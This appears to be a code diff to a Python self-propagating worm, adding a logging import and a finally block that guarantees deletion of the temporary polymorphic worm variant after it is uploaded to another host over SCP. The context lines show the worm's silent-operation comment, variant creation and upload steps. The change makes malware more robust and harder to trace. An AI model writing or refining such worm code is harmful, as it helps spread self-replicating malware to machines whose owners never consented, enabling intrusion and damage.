@@ -11,6 +11,7 @@ import glob
 import tempfile
 import string
 import traceback
+import logging
 
 ##   You would want to uncomment the following two lines for the worm to 
 ##   work silently:
@@ -169,6 +170,7 @@ while True:
                     
                     # Create polymorphic worm variant
                     print("[+] Creating polymorphic worm variant")
+                    temp_file_path = None
                     try:
                         temp_file = tempfile.NamedTemporaryFile(delete=False)
                         temp_file_path = temp_file.name
@@ -207,15 +209,17 @@ while True:
                         except Exception as e:
                             print(f"[+] Failed to upload worm: {str(e)}")
                             raise
-                        
-                        # Cleanup
-                        print(f"[+] Removing temporary file {temp_file_path}")
-                        os.unlink(temp_file_path)
-                        
                     except Exception as e:
                         print(f"[+] Error in polymorphic code: {str(e)}")
                         raise
-                    
+                    finally:
+                        # GUARANTEED CLEANUP: This runs whether the try or except block finished
+                        if temp_file_path and os.path.exists(temp_file_path):
+                            try:
+                                os.unlink(temp_file_path)
+                                print(f"[+] Successfully cleaned up temp file: {temp_file_path}")
+                            except OSError as e:
+                                print(f"[+] WARNING: Failed to clean up temp file {temp_file_path}: {e}")
                     # Close SCP connection
                     print("[+] Closing SCP connection")
                     scpcon.close()
